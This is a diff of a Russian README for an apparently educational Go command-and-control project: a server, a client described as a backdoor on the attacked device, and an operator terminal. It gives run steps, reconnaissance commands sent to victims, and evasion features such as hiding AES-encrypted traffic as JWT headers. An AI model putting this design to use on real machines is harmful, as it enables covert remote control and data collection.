@@ -11,6 +11,7 @@
 - Операционная система: Windows, Linux или macOS
 - Для выполнения Linux-команд на Windows: WSL (Windows Subsystem for Linux)
 - Docker (опционально, для запуска через контейнеры)
+- Windows Terminal (рекомендуется для корректного отображения TUI)
 
 ## Установка Go
 Скачайте и установите Go с официального сайта: https://go.dev/dl/
@@ -24,32 +25,66 @@ c2-project/
 │   ├── client/          # Клиент (бэкдор)
 │   └── terminal/        # Терминал оператора (TUI)
 ├── configs/             # Конфигурационные файлы
-│   ├── server.json      # Настройки сервера
-│   ├── client.json      # Настройки клиента
-│   └── terminal.json    # Настройки терминала
+│   ├── server.json      # Настройки сервера (Docker)
+│   ├── client.json      # Настройки клиента (Docker)
+│   ├── terminal.json    # Настройки терминала (Docker)
+│   ├── server.local.json    # Настройки сервера (локально)
+│   ├── client.local.json    # Настройки клиента (локально)
+│   └── terminal.local.json  # Настройки терминала (локально)
 ├── internal/            # Внутренние пакеты
-│   ├── crypto/          # Шифрование и сжатие
+│   ├── api/             # HTTP-хендлеры, роутеры, валидация
+│   ├── compress/        # Сжатие gzip
+│   ├── crypto/          # Шифрование AES-GCM
+│   ├── chunk/           # Фрагментация данных
+│   ├── jwt/             # JWT-токены
 │   ├── models/          # Структуры данных
-│   └── protocol/        # Протокол передачи
-├── Dockerfile           # Сборка Docker-образа
-├── docker-compose.yml   # Запуск всех компонентов
-├── .dockerignore        # Исключения для Docker
+│   ├── protocol/        # Протокол передачи
+│   └── storage/         # Хранилище задач и клиентов
+├── Dockerfile
+├── docker-compose.yml
+├── .dockerignore
 ├── go.mod
 ├── go.sum
 └── README.md
 ```
 
 ## Конфигурация
-Перед запуском убедитесь, что конфигурационные файлы содержат правильные адреса.
 
-### configs/server.json
+### Конфигурация для Docker
+
+**configs/server.json:**
 ```json
 {
     "listen_address": ":8080"
 }
 ```
 
-### configs/client.json
+**configs/client.json:**
+```json
+{
+    "server_url": "http://server:8080",
+    "client_id": "client-001",
+    "poll_interval": 5
+}
+```
+
+**configs/terminal.json:**
+```json
+{
+    "server_url": "http://server:8080"
+}
+```
+
+### Конфигурация для локального запуска
+
+**configs/server.local.json:**
+```json
+{
+    "listen_address": ":8080"
+}
+```
+
+**configs/client.local.json:**
 ```json
 {
     "server_url": "http://localhost:8080",
@@ -58,7 +93,7 @@ c2-project/
 }
 ```
 
-### configs/terminal.json
+**configs/terminal.local.json:**
 ```json
 {
     "server_url": "http://localhost:8080"
@@ -119,6 +154,7 @@ docker-compose down
 ## Запуск (локально, без Docker)
 
 Важно! Запускайте все компоненты в отдельных окнах терминала.
+Для корректного отображения TUI в Windows рекомендуется использовать Windows Terminal.
 
 Перед запуском перейдите в папку проекта:
 ```bash
@@ -127,7 +163,7 @@ cd c2-project
 
 ### 1. Запуск C2-сервера
 ```bash
-bin\c2-server.exe
+bin\c2-server.exe -local
 ```
 Ожидаемый вывод:
 ```
@@ -136,7 +172,7 @@ C2 Server starting on :8080
 
 ### 2. Запуск клиента (на атакуемом устройстве)
 ```bash
-bin\client.exe -id client-001
+bin\client.exe -local -id client-001
 ```
 Ожидаемый вывод:
 ```
@@ -146,13 +182,13 @@ bin\client.exe -id client-001
 
 Для запуска нескольких клиентов используйте аргумент `-id`:
 ```bash
-bin\client.exe -id client-001
-bin\client.exe -id client-002
+bin\client.exe -local -id client-001
+bin\client.exe -local -id client-002
 ```
 
 ### 3. Запуск терминала оператора (TUI)
 ```bash
-bin\terminal.exe
+bin\terminal.exe -local
 ```
 Ожидаемый вывод:
 ```
@@ -179,34 +215,44 @@ Client: client-001
 | `/help` | Показать справку |
 | `q` или `Ctrl+C` | Выйти из TUI |
 
-### Примеры команд:
-- `ls -la` — список файлов (Linux/WSL)
-- `whoami` — имя текущего пользователя
+### Примеры команд
+
+**Linux (через Docker):**
+- `ls -la` — список файлов
+- `ps aux | head -10` — первые 10 процессов
+- `echo "DEADBEEF" | base64` — кодирование в Base64
+- `whoami` — имя пользователя
 - `hostname` — имя компьютера
-- `dir` — список файлов (Windows)
-- `echo "Hello"` — вывод текста
-- `ps aux` — список процессов (Linux)
-- `cat /path/to/file` — просмотр файла (Linux)
+
+**Windows (локально):**
+- `whoami && hostname && ver` — информация о системе
+- `dir C:\ && echo OK || echo FAIL` — список файлов на диске C
+- `ipconfig && systeminfo | findstr /i "OS Name"` — IP и версия ОС
+- `tasklist | findstr /i "go"` — процессы с "go" в имени
 
 ## Пример работы
 
 ### Терминал оператора (TUI):
 ```
-C2 Terminal Operator v2.0
+C2 Terminal Operator v2.0  Client: client-001  Command executed
 
-> ls -la [client-001]
-=== РЕЗУЛЬТАТ ===
-total 44
-drwxr-xr-x 1 root root 4096 Aug 27 12:10 .
-drwxr-xr-x 1 root root 4096 Aug 27 12:12 ..
-...
-==================
+История команд:
+  > ls -la [client-001]
+  > whoami [client-001]
+
+Результат:
+┌────────────────────────────────────────────────────┐
+│ total 44                                           │
+│ drwxr-xr-x 1 root root 4096 Aug 27 12:10 .         │
+│ drwxr-xr-x 1 root root 4096 Aug 27 12:12 ..        │
+└────────────────────────────────────────────────────┘
+
+> Enter command...
 ```
 
 ### Логи сервера:
 ```
 [OK] Client registered: client-001
-[OK] Client registered: client-002
 [TASK] Task created: 17876693681484808600 -> ls -la
 [TASK] Task 17876693681484808600 found for client client-001
 [ENCRYPT] ADDITIONAL ENCRYPTION of task 17876693681484808600
@@ -218,10 +264,8 @@ drwxr-xr-x 1 root root 4096 Aug 27 12:12 ..
 ```
 [START] Client client-001 starting...
 [OK] Registration successful
-[DECRYPT] Decrypting received task
 [DECRYPT] Task decrypted: ls -la
 [EXEC] Executing: ls -la
-[ENCRYPT] Encrypting result for task ...
 [SEND] Encrypted result sent to server
 ```
 
@@ -229,12 +273,14 @@ drwxr-xr-x 1 root root 4096 Aug 27 12:12 ..
 - Протокол: HTTP
 - Шифрование: AES-256-GCM (симметричное)
 - Маскировка: JWT (передача в заголовке `Authorization: Bearer <token>`)
+- Фрагментация: чанки START/DATA/END (для данных > 1KB)
 - Сжатие: gzip (для результатов длиннее 5000 байт)
 
 ## Безопасность
 - Все данные шифруются AES-GCM
 - Передача маскируется под JWT-аутентификацию
 - Данные передаются в заголовках HTTP, а не в теле запроса
+- Крупные данные фрагментируются на чанки
 
 ## Устранение неполадок
 
@@ -247,11 +293,11 @@ drwxr-xr-x 1 root root 4096 Aug 27 12:12 ..
 ### Ошибка: "Connection refused"
 Решение: Убедитесь, что сервер запущен и конфигурации указывают на правильный адрес.
 
-### Команды Linux не работают на Windows
-Решение: Установите WSL (Windows Subsystem for Linux):
-```powershell
-wsl --install
-```
+### TUI отображается некорректно (наслаивается)
+Решение: Используйте Windows Terminal вместо обычного CMD. Он лучше поддерживает альтернативный экранный режим.
+
+### Некорректные символы при выполнении Windows-команд
+Команды выполняются корректно, статус всегда `completed`. Некорректные символы могут появляться из-за OEM-кодировки (CP866), которую Windows использует для консольного вывода. Это особенность отображения, а не ошибка программы. В Docker с Linux-командами такой проблемы нет.
 
 ### Docker: "port already in use"
 Решение: Остановите локальный сервер или измените порт в `configs/server.json`.
